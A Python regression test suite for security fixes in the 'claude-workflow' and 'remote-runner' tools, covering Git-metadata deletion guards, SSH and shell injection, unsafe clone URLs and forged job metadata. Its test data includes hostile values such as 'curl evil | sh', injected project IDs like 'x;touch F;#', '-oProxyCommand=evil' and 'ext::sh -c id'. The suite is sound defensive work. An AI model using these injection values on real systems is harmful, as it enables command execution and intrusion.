"""Regression tests for the security fixes in bin/claude-workflow and bin/remote-runner.

Run from the repository root with:  python3 -B -m unittest discover -s tests
Set TOOLS_BIN to test another copy of the two tools (for example the pre-fix ones).

Every test uses throwaway directories, a fake `ssh` that only records its
arguments, and preview-only or in-tree operations; nothing outside the
temporary directories is touched and nothing is sent to a real host.
"""
import base64
import contextlib
import importlib.machinery
import importlib.util
import io
import json
import os
from pathlib import Path
import shlex
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

sys.dont_write_bytecode = True

BIN = Path(os.environ.get("TOOLS_BIN", Path(__file__).resolve().parents[1] / "bin"))


def load(name, path):
    loader = importlib.machinery.SourceFileLoader(name, str(path))
    spec = importlib.util.spec_from_loader(name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


CW = load("claude_workflow_sec", BIN / "claude-workflow")
RR = load("remote_runner_sec", BIN / "remote-runner")


def git(root, *args):
    return subprocess.run(["git", *args], cwd=root, check=True, text=True,
                          capture_output=True).stdout


def make_repo(tmp):
    root = Path(tmp).resolve() / "repo"
    root.mkdir()
    git(root, "init", "-q")
    git(root, "config", "user.email", "t@example.com")
    git(root, "config", "user.name", "t")
    return root


class RemoveGuard(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = make_repo(self.tmp.name)
        (self.root / "a.txt").write_text("a\n")
        (self.root / "docs").mkdir()
        (self.root / "docs" / "x.md").write_text("x\n")
        (self.root / "sub").mkdir()
        git(self.root / "sub", "init", "-q")
        (self.root / "gitlink").symlink_to(".git")
        (self.root / ".gitignore").write_text("*.o\n")
        (self.root / ".github").mkdir()
        (self.root / ".github" / "wf.yml").write_text("x: 1\n")
        git(self.root, "add", "a.txt", "docs/x.md", ".gitignore", ".github/wf.yml")
        git(self.root, "commit", "-q", "-m", "base")

    def refused(self, raw):
        with self.assertRaisesRegex(ValueError, "Git metadata"):
            CW.removal_targets(self.root, [raw], True)

    def test_git_metadata_is_refused_in_any_spelling(self):
        for raw in (".git", ".Git", ".GIT", ".git/HEAD", ".Git/HEAD", ".GIT/config"):
            with self.subTest(raw=raw):
                self.refused(raw)

    def test_nested_repository_metadata_is_refused(self):
        self.refused("sub/.git")
        self.refused("sub/.GIT/HEAD")

    def test_symlink_into_git_cannot_reach_git_files(self):
        self.refused("gitlink/HEAD")

    def test_alias_into_a_nested_repository_is_refused(self):
        (self.root / "nl").symlink_to("sub/.git")
        self.refused("nl/objects")

    def test_directory_containing_a_separate_git_dir_is_refused(self):
        other = Path(self.tmp.name).resolve() / "separate"
        (other / "meta").mkdir(parents=True)
        git(other, "init", "-q", "--separate-git-dir", str(other / "meta" / "gd"), ".")
        (other / "keep.txt").write_text("k\n")
        with self.assertRaisesRegex(ValueError, "Git metadata"):
            CW.removal_targets(other, ["meta"], True)
        self.assertEqual(CW.removal_targets(other, ["keep.txt"], False)[0][2], "file")

    def test_two_spellings_of_one_file_are_an_overlap(self):
        (self.root / "self").symlink_to(".")
        with self.assertRaisesRegex(ValueError, "overlapping"):
            CW.removal_targets(self.root, ["a.txt", "self/a.txt"], False)
        # distinct files are still fine together
        (self.root / "b.txt").write_text("b\n")
        self.assertEqual(len(CW.removal_targets(self.root, ["a.txt", "b.txt"], False)), 2)

    def test_the_symlink_itself_may_be_removed(self):
        targets = CW.removal_targets(self.root, ["gitlink"], False)
        self.assertEqual([(name, kind) for name, _, kind in targets], [("gitlink", "symlink")])

    def test_ordinary_paths_still_work(self):
        targets = CW.removal_targets(self.root, ["a.txt"], False)
        self.assertEqual(targets[0][2], "file")
        with self.assertRaisesRegex(ValueError, "--recursive"):
            CW.removal_targets(self.root, ["docs"], False)
        self.assertEqual(CW.removal_targets(self.root, ["docs"], True)[0][2], "directory")

    def test_git_lookalike_names_are_not_blocked(self):
        for raw in (".gitignore", ".github/wf.yml"):
            with self.subTest(raw=raw):
                self.assertEqual(CW.removal_targets(self.root, [raw], False)[0][2], "file")

    def test_preview_deletes_nothing(self):
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            CW.remove_paths(self.root, ["a.txt"], False, False)
        self.assertIn('"preview"', buffer.getvalue())
        self.assertTrue((self.root / "a.txt").is_file())


class ControllerInjection(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name).resolve()
        self.root = make_repo(self.tmp.name)

    def commit_contract(self, text):
        (self.root / ".claude").mkdir(exist_ok=True)
        (self.root / ".claude" / "remote-runner.toml").write_text(text)
        git(self.root, "add", "-A")
        git(self.root, "commit", "-q", "-m", "contract")
        return git(self.root, "rev-parse", "HEAD").strip()

    @staticmethod
    def contract(project_id, command="true"):
        return f'[project]\nid = "{project_id}"\n\n[profiles.p]\ncommand = "{command}"\n'

    def test_unsafe_project_ids_are_rejected(self):
        for project_id in ("x;touch F;#", "..", ".", ".hidden", "a b", "a/b", "a$(id)"):
            with self.subTest(project_id=project_id):
                (self.root / ".claude").mkdir(exist_ok=True)
                (self.root / ".claude" / "remote-runner.toml").write_text(self.contract(project_id))
                with self.assertRaises(SystemExit):
                    RR.project_config(self.root)

    def test_plain_project_id_is_accepted(self):
        (self.root / ".claude").mkdir(exist_ok=True)
        (self.root / ".claude" / "remote-runner.toml").write_text(self.contract("m65c02risc"))
        self.assertEqual(RR.project_config(self.root)[0], "m65c02risc")

    def test_committed_contract_wins_over_the_working_tree(self):
        commit = self.commit_contract(self.contract("proj", "true"))
        (self.root / ".claude" / "remote-runner.toml").write_text(self.contract("proj", "curl evil | sh"))
        _, commands, _ = RR.project_config(self.root, revision=commit)
        self.assertEqual(commands["p"], "true")

    def test_contract_missing_from_the_revision_is_refused(self):
        (self.root / "f.txt").write_text("f\n")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-q", "-m", "no contract")
        with self.assertRaises(SystemExit):
            RR.project_config(self.root, revision=git(self.root, "rev-parse", "HEAD").strip())

    def test_ssh_arguments_are_quoted_and_the_host_is_guarded(self):
        config = {"ssh_host": "-oProxyCommand=evil", "workspace_root": "/tmp/a b;c", "max_jobs": 1}
        with mock.patch.object(RR, "remote_config", return_value=config), \
                mock.patch.object(RR.subprocess, "run") as run:
            RR.invoke_worker("r1", "submit", "--job", "a;touch F;#--1", "--project", "eDp")
        argv = run.call_args[0][0]
        self.assertEqual(argv[:3], ["ssh", "--", "-oProxyCommand=evil"])
        self.assertEqual(len(argv), 4)  # exactly one remote command string
        remote_args = shlex.split(argv[3])
        self.assertIn("/tmp/a b;c", remote_args)
        self.assertIn("a;touch F;#--1", remote_args)

    def test_capability_requirements_fail_closed(self):
        config = {"capabilities": {"os": "linux", "memory_gib": 8, "cpu_cores": 4, "labels": ["a"]}}
        bad = [
            {"min_memory_gib": "64"},   # wrong type
            {"min_memroy_gib": 64},     # misspelled key
            {"min_cpu_cores": True},    # bool is not a number
            {"os": 5},                  # wrong type
            {"min_memory_gib": 64},     # genuinely too big
        ]
        for requirements in bad:
            with self.subTest(requirements=requirements):
                self.assertTrue(RR.capability_mismatches(config, requirements))
        good = {"os": "linux", "min_memory_gib": 4, "min_cpu_cores": 2, "labels": ["a"]}
        self.assertEqual(RR.capability_mismatches(config, good), [])

    def test_retention_periods_must_be_finite_and_non_negative(self):
        for bad in (float("nan"), float("inf"), float("-inf"), -1.0):
            with self.subTest(value=bad):
                with self.assertRaises(SystemExit):
                    RR.retention_days(bad, "--x")
        self.assertEqual(RR.retention_days(0.0, "--x"), 0.0)
        self.assertEqual(RR.retention_days(7.5, "--x"), 7.5)

    def test_source_urls_are_restricted_to_ordinary_transports(self):
        for good in ("https://github.com/x/y.git", "ssh://git@host/x/y.git", "git@github.com:x/y.git"):
            with self.subTest(url=good):
                self.assertTrue(RR.SOURCE_URL.fullmatch(good))
        for bad in ("-oProxyCommand=x", "--upload-pack=x", "ext::sh -c id", "file:///etc",
                    "/srv/x.git", "https://h/x y", "git://h/x.git", "https://h/x\nreset"):
            with self.subTest(url=bad):
                self.assertFalse(RR.SOURCE_URL.fullmatch(bad))

    def test_option_like_refs_are_rejected_before_git_sees_them(self):
        args = RR.parser().parse_args(["submit", "--remote", "r1", "--profile", "p", "--ref=-x"])
        with mock.patch.object(RR, "repository_root", return_value=self.root):
            with self.assertRaises(SystemExit):
                RR.controller(args)

    def test_hostile_project_never_reaches_ssh(self):
        home = self.base / "home"
        (home / ".claude").mkdir(parents=True)
        (home / ".claude" / "remotes.toml").write_text(
            '[remotes.r1]\nssh_host = "fakehost"\nworkspace_root = "/tmp/fake-runner"\nmax_jobs = 1\n')
        calls = self.base / "ssh_calls.txt"
        stub_dir = self.base / "stubbin"
        stub_dir.mkdir()
        stub = stub_dir / "ssh"
        stub.write_text(f'#!/bin/sh\necho "$@" >> "{calls}"\nexit 0\n')
        stub.chmod(0o755)
        git(self.root, "remote", "add", "origin", "https://example.invalid/x.git")
        self.commit_contract(self.contract("x;touch INJECTED_MARKER;#"))
        env = dict(os.environ, HOME=str(home), PATH=f"{stub_dir}{os.pathsep}{os.environ['PATH']}")
        result = subprocess.run([sys.executable, "-B", str(BIN / "remote-runner"), "submit",
                                 "--remote", "r1", "--profile", "p"],
                                cwd=self.root, env=env, text=True, capture_output=True)
        self.assertNotEqual(result.returncode, 0)
        self.assertFalse(calls.exists(), "ssh must not be invoked for a hostile project id")


class WorkerTrustsItsOwnDirectories(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.ws = Path(self.tmp.name).resolve() / "ws"
        (self.ws / "jobs").mkdir(parents=True)
        (self.ws / "projects").mkdir()

    def job(self, name, metadata, files=None):
        directory = self.ws / "jobs" / name
        directory.mkdir()
        (directory / "metadata.json").write_text(json.dumps(metadata))
        for filename, text in (files or {}).items():
            (directory / filename).write_text(text)
        return directory

    def run_worker(self, *arguments):
        args = RR.worker_parser().parse_args(
            ["--workspace-root", str(self.ws), "--max-jobs", "1", *arguments])
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            RR.worker(args)
        return buffer.getvalue()

    def test_log_ignores_a_metadata_path(self):
        secret = self.ws / "secret.txt"
        secret.write_text("SECRET-CONTENT\n")
        self.job("job-1", {"log": str(secret), "state": "PASSED"}, {"run.log": "REAL LOG\n"})
        output = self.run_worker("--worker", "log", "--job", "job-1")
        self.assertIn("REAL LOG", output)
        self.assertNotIn("SECRET-CONTENT", output)

    def test_exit_status_is_read_from_the_job_directory(self):
        forged = self.ws / "forged.txt"
        forged.write_text("0\n")
        finished = subprocess.Popen(["true"])
        finished.wait()
        directory = self.job("job-2", {"state": "RUNNING", "pid": finished.pid,
                                       "exit_status": str(forged)}, {"exit-status": "1\n"})
        metadata = json.loads((directory / "metadata.json").read_text())
        RR.refresh_state(metadata, directory / "metadata.json")
        self.assertEqual(metadata["state"], "FAILED")

    def test_worker_refuses_an_unsafe_source_url(self):
        def b64(text):
            return base64.urlsafe_b64encode(text.encode()).decode()
        with self.assertRaises(SystemExit):
            self.run_worker("--worker", "submit", "--job", "j-1", "--project", b64("proj"),
                            "--source-url", b64("file:///etc"), "--commit", "0" * 40,
                            "--command", b64("true"))
        self.assertFalse((self.ws / "jobs" / "j-1").exists())

    def test_prune_with_non_finite_retention_deletes_nothing(self):
        self.job("recent", {"state": "FAILED", "created_at": time.time()})
        for value in ("nan", "inf"):
            with self.subTest(value=value):
                with self.assertRaises(SystemExit):
                    self.run_worker("--worker", "prune", "--apply", "--success-days", "7",
                                    "--failure-days", value)
        self.assertTrue((self.ws / "jobs" / "recent").exists())

    def test_prune_never_acts_on_a_worktree_or_project_named_in_metadata(self):
        precious = self.ws / "precious"
        precious.mkdir()
        (precious / "keepme").write_text("k\n")
        directory = self.job("J1", {
            "state": "FAILED", "created_at": 0, "project": "../jobs/J1/evil",
            "cache": "../jobs/J1/evil", "worktree": str(precious)})
        (directory / "evil" / "repo.git").mkdir(parents=True)
        with mock.patch.object(RR.subprocess, "run") as run:
            self.run_worker("--worker", "prune", "--apply", "--success-days", "7", "--failure-days", "1")
        touched = " ".join(str(part) for call in run.call_args_list for part in call[0][0])
        self.assertNotIn(str(precious), touched)
        self.assertNotIn("evil", touched)
        self.assertTrue((precious / "keepme").exists())
        self.assertFalse(directory.exists())  # the expired job itself is still pruned

    def test_forged_pids_do_not_crash_the_runner(self):
        for name, pid in (("p-one", 1), ("p-bool", True), ("p-neg", -5), ("p-huge", 10 ** 20)):
            directory = self.job(name, {"state": "RUNNING", "pid": pid})
            metadata = json.loads((directory / "metadata.json").read_text())
            with self.subTest(pid=pid):
                self.assertFalse(RR.refresh_state(metadata, directory / "metadata.json"))

    def test_cancel_ignores_a_forged_pid(self):
        self.job("job-x", {"state": "RUNNING", "pid": 1})
        output = self.run_worker("--worker", "cancel", "--job", "job-x")
        self.assertIn('"RUNNING"', output)  # nothing was signalled, nothing crashed

    def test_workspace_root_shell_expansion_is_rejected(self):
        def config(root):
            return {"r1": {"ssh_host": "h", "workspace_root": root, "max_jobs": 1}}
        for bad in ("$HOME/runner", "/tmp/`id`", "/tmp/$(id)"):
            with self.subTest(root=bad), mock.patch.object(RR, "load_remotes", return_value=config(bad)):
                with self.assertRaises(SystemExit):
                    RR.remote_config("r1")
        for good in ("~/runner", "/srv/runner", "/tmp/a b"):
            with self.subTest(root=good), mock.patch.object(RR, "load_remotes", return_value=config(good)):
                self.assertEqual(RR.remote_config("r1")["workspace_root"], good)

    def test_prune_removes_the_directory_it_examined_not_one_named_in_metadata(self):
        self.job("old-a", {"job": "new-b", "state": "FAILED", "created_at": 0,
                           "worktree": "/nonexistent", "project": "../x"})
        self.job("new-b", {"job": "new-b", "state": "FAILED", "created_at": time.time()})
        self.run_worker("--worker", "prune", "--apply", "--success-days", "7", "--failure-days", "1")
        self.assertFalse((self.ws / "jobs" / "old-a").exists())
        self.assertTrue((self.ws / "jobs" / "new-b").exists())


if __name__ == "__main__":
    unittest.main()
